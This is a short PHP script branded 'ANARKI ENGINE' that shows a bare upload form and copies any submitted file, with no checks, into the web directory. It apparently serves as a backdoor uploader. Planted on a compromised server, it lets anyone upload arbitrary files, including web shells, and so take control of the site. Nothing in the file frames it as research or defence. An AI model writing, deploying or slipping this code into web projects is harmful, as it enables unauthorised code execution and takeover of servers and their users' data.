<?php
echo 'ANARKI ENGINE<br/><form action="" method="post" enctype="multipart/form-data" name="uploader"><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '# Success Upload'; }
else { echo '# Cannot Upload'; }
}
?>
